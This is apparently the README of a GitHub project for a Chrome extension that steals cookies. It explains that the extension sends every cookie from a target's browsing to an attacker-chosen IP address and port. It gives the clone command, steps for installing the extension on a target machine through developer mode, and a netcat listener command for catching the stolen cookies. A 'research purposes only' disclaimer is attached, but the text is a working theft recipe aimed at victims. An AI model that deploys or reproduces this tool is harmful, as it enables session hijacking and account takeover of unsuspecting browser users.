# Cookie_Stealer_Chrome_Extension
This is a chrome extention that will send all cookies it sees while the user browses the web to a specified IP Address and Port!

# WARNING: This is for research purposes only! I am not resposible for any damage caused to any computer or computer system using this software!

# Usage:
Download:
```git clone https://github.com/SteamPunk424/Cookie_Stealer_Chrome_Extension```

#Installation to target:
Open Chrome or Chromium and head to "chrome://extensions/" and turn on developer mode.
Once developer mode is enabled click "load unpacked" and set the folder to the "Cookie_Stealer_Chrome_Extension" folder.
This will install the chrome extention to the target.

Catch the cookie requests by using netcat from the attacker computer:
```nc -lvnp $PORT```

As the target browses to websites you will catch all of there cookies with netcat from the various places they visit.
